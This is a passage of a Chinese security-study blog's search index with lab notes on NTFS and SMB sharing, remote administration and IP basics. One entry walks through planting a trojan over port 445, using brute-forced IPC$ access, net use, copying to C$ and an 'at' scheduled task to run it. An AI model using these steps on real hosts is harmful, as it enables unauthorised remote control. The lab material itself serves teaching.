            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4、实验、利用445植入木马</title>
      <link href="/2020/06/01/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/7%E5%AE%9E%E9%AA%8C%E3%80%81%E5%88%A9%E7%94%A8445%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC/"/>
      <url>/2020/06/01/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/7%E5%AE%9E%E9%AA%8C%E3%80%81%E5%88%A9%E7%94%A8445%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="实验、利用445植入木马"><a href="#实验、利用445植入木马" class="headerlink" title="实验、利用445植入木马"></a>实验、利用445植入木马</h1><h2 id="一、实验内容：神奇的木马"><a href="#一、实验内容：神奇的木马" class="headerlink" title="一、实验内容：神奇的木马"></a>一、实验内容：神奇的木马</h2><h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>通过经典的木马攻击还原场景，来学习木马的制作，并实现植入木马对目标主机进行完全控制。</p><h2 id="三、木马概述"><a href="#三、木马概述" class="headerlink" title="三、木马概述"></a>三、木马概述</h2><h4 id="什么是木马"><a href="#什么是木马" class="headerlink" title="什么是木马"></a>什么是木马</h4><p>木马通常称为黑客程序的恶意代码，可以为黑客提供远程控制植入主机的服务，木马也称为特洛伊木马（特洛伊木马，来自一个古代的战争故事。）。</p><h4 id="木马的传播途径"><a href="#木马的传播途径" class="headerlink" title="木马的传播途径"></a>木马的传播途径</h4><p>1、互联网浏览，通过浏览器漏洞或浏览器插件漏洞（Flash、迅雷等）；</p><p>2、QQ、MSN等即时通讯软件，发送恶意网址链接或木马病毒文件；</p><p>3、使用U盘等移动存储介质；</p><p>4、陌生邮件，通过电子邮件内恶意代码或含木马病毒的附件；</p><p>5、伪装成多媒体影音文件或植入木马的应用软件，利用P2P平台和网站传播；</p><p>6、<strong>利用操作系统漏洞或弱口令直接远程植入；</strong></p><p>7、下载来源不明的程序。</p><h4 id="木马的组成"><a href="#木马的组成" class="headerlink" title="木马的组成"></a>木马的组成</h4><ul><li>客户端程序：黑客主机上的控制台，负责远程遥控指挥与木马连接。</li><li>服务器端程序：服务器端程序即是木马程序，它被隐藏安装在被攻击（受害）方的电脑上，目标主机也称为肉鸡。</li></ul><h2 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h2><p>1、准备肉鸡服务器、黑客客户端，并桥接保证连通性</p><p>2、使用木马制作工具（远程连接软件自动生成）获得木马服务程序。木马以服务的形式植入到肉机中。</p><p>3、端口扫描，scanport扫描局域网内有没有445端口（共享文件服务）在开放。</p><p>4、选择肉鸡使用NTscan工具进行暴力破解，连接对方的IPC空连接</p><ul><li>连接远程共享的命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP地址\IPC$ 密码 &#x2F;user:用户名</span><br><span class="line">net use * &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure><ul><li>利用copy命令从黑客客户机中把木马服务copy到肉机中</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 木马地址 \\IP地址\C$</span><br></pre></td></tr></table></figure><ul><li>利用IPC空连接可执行命令的特点，设置肉机的计划任务，让其自动运行木马服务。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time \\IP地址</span><br><span class="line">at \\10.1.1.2 服务器至少3-5分钟之后的时间 C:\木马程序名</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3、NTFS磁盘权限</title>
      <link href="/2020/05/31/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/6NTFS%E6%9D%83%E9%99%90%E4%B8%8E%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2020/05/31/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/6NTFS%E6%9D%83%E9%99%90%E4%B8%8E%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="NTFS权限"><a href="#NTFS权限" class="headerlink" title="NTFS权限"></a>NTFS权限</h1><h2 id="一、文件系统"><a href="#一、文件系统" class="headerlink" title="一、文件系统"></a>一、文件系统</h2><p>文件系统：外部存储设备在操作系统中组织文件的方法。</p><p>Windows常见的文件系统：<strong>NTFS</strong>、FAT。</p><p>Linux常见的文件系统：EXT。</p><p><strong>NTFS</strong>：支持单个文件大于4个G、可以设置访问权限、优点很多。</p><p><strong>FAT32</strong>：适合小存储的硬盘。</p><h2 id="二、NTFS文件系统权限管理"><a href="#二、NTFS文件系统权限管理" class="headerlink" title="二、NTFS文件系统权限管理"></a>二、NTFS文件系统权限管理</h2><p>​                                                                                                                                                                                                                                                <strong>权限选项</strong>：修改包括了删除；完全控制包括一个特殊的权限。</p><p><strong>权限的继承</strong>：默认情况下子文件夹下的所有文件都继承于父文件夹的权限。如果要特殊修改，需要修改取消继承关系（最好选择复制权限状态）。</p><p><strong>权限的累加</strong>：当一个文件权限设置中某一个用户存在多个组中，则这个用户的权限为所有存在组权限的累加状态。</p><p><strong>管理员的特殊权限</strong>：修改文件权限所有者，使管理员获得文件所有权。</p><hr><h1 id="文件共享服务器（SMB-Server-Messages-Block）"><a href="#文件共享服务器（SMB-Server-Messages-Block）" class="headerlink" title="文件共享服务器（SMB Server Messages Block）"></a>文件共享服务器（SMB Server Messages Block）</h1><h2 id="一、共享服务器概述"><a href="#一、共享服务器概述" class="headerlink" title="一、共享服务器概述"></a>一、共享服务器概述</h2><p>Windows系统文件共享服务端口始终默认开启：445（smb/samba）。（验证445端口是否开启服务不建议用<code>netstat -an</code>，建议用net share ）</p><p>换句话说，其实每一台Windows系统的电脑都默认是一个文件共享服务器。<strong>并且默认C与D盘都被隐藏共享了！</strong></p><h2 id="二、共享服务器中的共享权限管理"><a href="#二、共享服务器中的共享权限管理" class="headerlink" title="二、共享服务器中的共享权限管理"></a>二、共享服务器中的共享权限管理</h2><p><strong>设置共享文件夹与权限</strong>：右键文件夹设置共享文件夹开启，并且设置权限。</p><p><strong>远程访问共享文件夹的权限</strong>：远程访问服务器时，对文件的访问权限取用户的共享文件夹权限与NTFS文件夹权限的交集。（换句话说权限需双重验证）</p><p><strong>访问共享文件服务器</strong>： 连续两个\ 代表网络文件路径，对于客户机来说文件名为共享文件夹服务器设置共享文件夹时设置的共享名。</p><p><strong>隐藏共享文件夹</strong>：在共享名后加 $ 符号，共享服务器中该文件夹就会隐藏，只能通过网络路径+共享名$才能打开。</p><p><strong>共享文件夹相关命令</strong></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> share             #列出共享列表</span><br><span class="line"><span class="built_in">net</span> share 共享名 /<span class="built_in">del</span> #删除共享</span><br></pre></td></tr></table></figure><p><strong>关闭默认的系统分区隐藏共享</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、打开注册表：</span><br><span class="line">运行-》regedit（打开注册表编辑器）</span><br><span class="line">注册表编辑器：存储在系统中被安装软件的相关注册信息。</span><br><span class="line">2、定位共享注册表位置：</span><br><span class="line">HKEY_Local_MACINE\System\CurrentControlSet\Services\LanmanServer\parameters 在右侧区域右键新建一个REG_DWORD类型的AutoShareServer键，值为0</span><br></pre></td></tr></table></figure><p><strong>关闭文件共享服务445(smb/samba)端口</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、打开service.msc找到Server停止并禁用它。</span><br><span class="line">2、仅使用于win7以上系统和win2008以上系统：配置高级安全防火墙-入站规则，增加入站规则阻止端口445的访问。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2、Windows远程管理</title>
      <link href="/2020/05/31/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/5.4-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
      <url>/2020/05/31/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/5.4-%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows远程管理"><a href="#Windows远程管理" class="headerlink" title="Windows远程管理"></a>Windows远程管理</h1><h2 id="一、远程管理类型"><a href="#一、远程管理类型" class="headerlink" title="一、远程管理类型"></a>一、远程管理类型</h2><p>Windows远程管理类型有两种：</p><p>1、图形化界面方式(远程桌面 RDP:remote desktop protocol)：mstsc</p><p>2、命令行方式：telnet</p><p>远程桌面端口3389 (RDP, remote desktop protocol)</p><p>telnet端口23 (telnet)</p><h2 id="实验：Xp控制win2003"><a href="#实验：Xp控制win2003" class="headerlink" title="实验：Xp控制win2003"></a>实验：Xp控制win2003</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一、mstc</span><br><span class="line"></span><br><span class="line">在开始前需要在我的电脑-》属性-》远程中开启允许远程控制。</span><br><span class="line">服务器受控制不影响本机器的使用；个人系统受控制会强制登出（个人系统只允许一个人访问）</span><br><span class="line"></span><br><span class="line">二、telnet</span><br><span class="line"></span><br><span class="line">首先在计算机管理-》服务-》开启Telnet服务。（运行 services.msc）启动类型**自动**意味着每次开机自动开启此服务。</span><br><span class="line">其他各种服务：workstation上网服务、installer安装软件服务、firewall防火墙、time自动更新互联网时间......</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1、IP地址及相关网络地址概念详解</title>
      <link href="/2020/05/30/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/5.123-IP%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E6%A6%82%E5%BF%B5%E8%AF%A6%E8%A7%A3/"/>
      <url>/2020/05/30/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/5.123-IP%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E6%A6%82%E5%BF%B5%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="IP地址相关网络地址概念详解"><a href="#IP地址相关网络地址概念详解" class="headerlink" title="IP地址相关网络地址概念详解"></a>IP地址相关网络地址概念详解</h1><h2 id="一、IP地址定义"><a href="#一、IP地址定义" class="headerlink" title="一、IP地址定义"></a>一、IP地址定义</h2><p>IP地址实质上就是32位二进制组成的，32位二进制分为四个段，每8位为一段。四段IP地址又分为网络位、主机位。</p><h2 id="二、子网掩码定义"><a href="#二、子网掩码定义" class="headerlink" title="二、子网掩码定义"></a>二、子网掩码定义</h2><p>子网掩码：subnet mask（SM）确定IP地址的网络位。一个IP地址<strong>必须</strong>配一个子网掩码。</p><p>255.0.0.0 / 255.255.0.0 / 255.255.255.0 / 255.255.255.255</p><p>255为网络位，0为主机位。</p><p>局域网通信规则：主机IP在同一网段中才能通信。</p><hr><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a><strong>实验</strong></h3><h4 id="1、虚拟机中模拟两台主机连接到一台交换机中。"><a href="#1、虚拟机中模拟两台主机连接到一台交换机中。" class="headerlink" title="1、虚拟机中模拟两台主机连接到一台交换机中。"></a>1、虚拟机中模拟两台主机连接到一台交换机中。</h4><p>虚拟机设置中，网络连接方式改为虚拟连接，两台虚拟机选择同一个虚拟连接的连接口，就相当于将两台电脑的网线连接到了同一台交换机上。</p><h4 id="2、给两台主机设置IP地址与子网掩码"><a href="#2、给两台主机设置IP地址与子网掩码" class="headerlink" title="2、给两台主机设置IP地址与子网掩码"></a>2、给两台主机设置IP地址与子网掩码</h4><p>设置为同一网段，不同主机号。</p><h4 id="3、测试是否可以连通"><a href="#3、测试是否可以连通" class="headerlink" title="3、测试是否可以连通"></a>3、测试是否可以连通</h4><p>使用<code>ping</code>命令测试连通。</p><hr><h1 id="三、IP地址分类"><a href="#三、IP地址分类" class="headerlink" title="三、IP地址分类"></a>三、IP地址分类</h1><p>国际标准化组织ISO规定IP地址的分类以第一个段分辨。</p><p>A类：1-126                <strong>默认</strong>子网掩码：255.0.0.0</p><p>​    A类中10.0.0.0 - 10.255.255.255是私有地址。</p><p>B类：128-191            <strong>默认</strong>子网掩码：255.255.0.0</p><p>​    B类中172.16.0.0 - 172.31.255.255是私有地址。</p><p>C类：192-223            默认子网掩码：255.255.255.0 </p><p>​    C类中192.168.0.0 - 192.168.255.255是私有地址。</p><p>D类：224-239            组播地址</p><p>E类：240-254             科研使用</p><p>127开头的IP为回环地址、255开头的IP为子网掩码，<strong>主机位全为255的IP为广播地址。</strong>0开头的后面讲，<strong>主机位全为0的是网段标识符。</strong></p><p><strong>全局广播地址</strong>：255.255.255.255； <strong>无IP地址主机</strong>：0.0.0.0</p><h1 id="四、路由器与交换机"><a href="#四、路由器与交换机" class="headerlink" title="四、路由器与交换机"></a>四、路由器与交换机</h1><p>家用路由器是路由器和交换机的结合产品，并且配备了DHCP服务器。一般路由器提供多个 LAN口和一个WAN口。其实WAN口就是路由器口，用于连接互联网；LAN口是交换机口，用于连接局域网。</p><p><strong>路由器</strong>：用于与不同网段通信。</p><p><strong>交换机</strong>：组建局域网，使同网段的主机相互通信。</p><h1 id="五、网关"><a href="#五、网关" class="headerlink" title="五、网关"></a>五、网关</h1><p>主机通过IP地址发送数据包时，会通过自己的子网掩码、IP地址和对方的IP地址判断，对方是不是和我是同一个网段。如果不是的话，就需要将数据包发送给网关，请求与其他网段进行通信。</p><p><strong>网关</strong>：路由器内网端口就是网关，网关通常为1或者254，需要工程师配置。</p><h1 id="六、DNS域名解析服务器"><a href="#六、DNS域名解析服务器" class="headerlink" title="六、DNS域名解析服务器"></a>六、DNS域名解析服务器</h1><p>如果DNS不配置的话也可以上网，但是只能用IP地址。如果配置了DNS服务器，就可以通过域名来访问某一服务。</p><p>某地区某运营商的的DNS服务器IP可以通过百度搜索到。</p><h1 id="七、网络测试命令"><a href="#七、网络测试命令" class="headerlink" title="七、网络测试命令"></a>七、网络测试命令</h1><h2 id="1、如何查看IP地址"><a href="#1、如何查看IP地址" class="headerlink" title="1、如何查看IP地址"></a>1、如何查看IP地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig -all 查看网卡IP地址详细信息</span><br></pre></td></tr></table></figure><h2 id="2、ping命令"><a href="#2、ping命令" class="headerlink" title="2、ping命令"></a>2、ping命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l  length包大小 最大65500左右 64KB左右</span><br><span class="line"></span><br><span class="line">-t 无限发</span><br><span class="line"></span><br><span class="line">-n number指定发数据包的数量</span><br></pre></td></tr></table></figure><h2 id="3、手工解析域名"><a href="#3、手工解析域名" class="headerlink" title="3、手工解析域名"></a>3、手工解析域名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup：查询域名为IP地址，？通过DNS服务器?</span><br></pre></td></tr></table></figure><h2 id="4、扫描本地主机开放端口"><a href="#4、扫描本地主机开放端口" class="headerlink" title="4、扫描本地主机开放端口"></a>4、扫描本地主机开放端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据通信安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据通信安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>分类目录</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p>大家好，我是XXX。欢迎来到我的个人技术博客。</p><p>这里用markdown写下你的简介，就跟平时写md一样就可以了。</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>读书</title>
      <link href="/reading/index.html"/>
      <url>/reading/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
